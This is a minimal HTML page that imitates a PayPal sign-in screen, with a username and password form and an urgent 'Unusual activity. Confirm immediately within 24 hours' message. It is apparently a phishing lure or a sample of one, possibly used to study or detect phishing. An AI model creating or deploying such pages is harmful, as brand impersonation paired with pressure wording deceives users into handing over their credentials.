<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>PayPal Login - Sign in to your account</title>
  </head>
  <body>
    <h1>Sign in</h1>
    <form action="/login" method="post">
      <input type="text" name="user" autocomplete="username" />
      <input type="password" name="password" autocomplete="current-password" />
      <button type="submit">Sign in</button>
    </form>
    <p>Unusual activity. Confirm immediately within 24 hours.</p>
  </body>
</html>
